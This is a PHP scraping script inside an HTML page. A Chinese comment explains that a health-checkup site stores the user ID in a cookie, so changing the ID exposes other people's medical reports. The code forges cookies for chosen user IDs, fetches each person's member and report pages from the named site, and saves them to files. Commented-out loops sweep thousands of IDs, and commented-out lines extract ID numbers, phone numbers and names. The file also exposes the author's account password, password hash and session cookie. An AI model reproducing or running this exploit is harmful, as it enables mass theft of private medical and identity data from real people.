
<HTML>
 <HEAD>
  <TITLE> Test Page</TITLE>
	<meta http-equiv=Content-Type content="text/html;charset=GB2312">
 </HEAD>

 <BODY>


<?PHP
/*
最近公司组织去杭州海勤疗养院进行全员体检,体检完成后发了一张纸条,上面有查询帐号和密码.
给我帐号是:480554 密码是:37952283
于是登陆上去,习惯性的看了下Cookie,结果发现该网站将UID和PWD写在Cookie里.
于是将自己的UID+1,刷新页面后发现能看到别人的体检报告...
*/
$head[0] = 'Host: hzhailiao.jiankang.cn';
$head[]  = 'Connection: keep-alive'; 
$head[]  = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'; 
$head[]  = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1918.0 Safari/537.36'; 
$head[]  = 'Referer: http://hzhailiao.jiankang.cn/check.php'; 
$head[]  = 'Accept-Encoding: gzip,deflate,sdch'; 
$head[]  = 'Accept-Language: zh-CN,zh;q=0.8'; 

$uid=72901;
//for($uid=72900;$uid<72913;$uid++)
//for($uid=50000;$uid<60000;$uid++)
{
// 初始化一个 cURL 对象
$curl = curl_init();

// 指定代理地址
//curl_setopt($curl, CURLOPT_PROXY, '192.168.2.121:8888');
// 如果需要的话，提供用户名和密码
//curl_setopt($curl, CURLOPT_PROXYUSERPWD,'user:pass');

// 设置你需要抓取的URL
curl_setopt($curl, CURLOPT_URL, 'http://hzhailiao.jiankang.cn/member.php');

// 设置header,curl_exec返回的data内容不包括header
curl_setopt($curl, CURLOPT_HEADER, 0);

$head[7]  = 'Cookie: PHPSESSID=jtc7jpbrn3nu37608kaqpomlp7; uid='.$uid.'; login=480554; passwd=a60b1414b147d4db1b2bd7827e3fc153; regdate=2014-09-15'; 


// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_HTTPHEADER, $head);

curl_setopt($curl, CURLOPT_POST, 0);

// 运行cURL，请求网页
$data = curl_exec($curl);

if ($data === FALSE) {
    echo "cURL Error: " . curl_error($curl);
}

//$info = curl_getinfo($curl);
//echo 'Get '. $info['url'] . ' Cost '. $info['total_time'] . ' Second<BR><BR><BR>';
//echo strstr($data, 'id="id_number" value="');

//echo $data;
$data2 = str_replace('<p style="color:red">请填写您的常用手机号，以便医师能第一时间联系到您本人。</p>','',$data);
//echo explode('<td align="right" class="m">地址：</td>',strstr($data2, '<table align="center" width="100%" cellpadding="5" class="sz_tab">'))[0];
$output1 = explode('<td align="right" class="m">地址：</td>',strstr($data2, '<table align="center" width="100%" cellpadding="5" class="sz_tab">'))[0].'</tr></tbody></table><HR>';
//echo $output1;

curl_setopt($curl, CURLOPT_URL, 'http://hzhailiao.jiankang.cn/check.php');
curl_setopt($curl, CURLOPT_HTTPHEADER, $head);
$data = curl_exec($curl);
$data2 = explode('"',strstr($data, '/check.php?act=report'),2)[0];
//echo $data2;
curl_setopt($curl, CURLOPT_URL, 'http://hzhailiao.jiankang.cn'.$data2);
curl_setopt($curl, CURLOPT_HTTPHEADER, $head);
$data = curl_exec($curl);
//echo '<BR>http://hzhailiao.jiankang.cn'.$data2;

$f = fopen('./jk/uid_'.$uid.'.html','w+');
fwrite($f,$output1);
fwrite($f,$data);
fclose($f);

/*
echo "<BR>ID Num:";
echo explode('"',substr(strstr($data, 'id="id_number" value="'),22,20),2)[0];
echo "<BR>Mobile:";
echo explode('"',substr(strstr($data, 'id="mobile" value="'),19,20),2)[0];
echo "<BR>Name:";
echo explode('"',substr(strstr($data, 'name="name" value="'),19,30),2)[0];
echo "<BR>Type:";
echo explode('"',substr(strstr($data, 'name="company" value="'),22,50),2)[0];
echo "<BR><BR><BR>";
*/


// 关闭URL请求
curl_close($curl);
}
?>
 </BODY>
</HTML>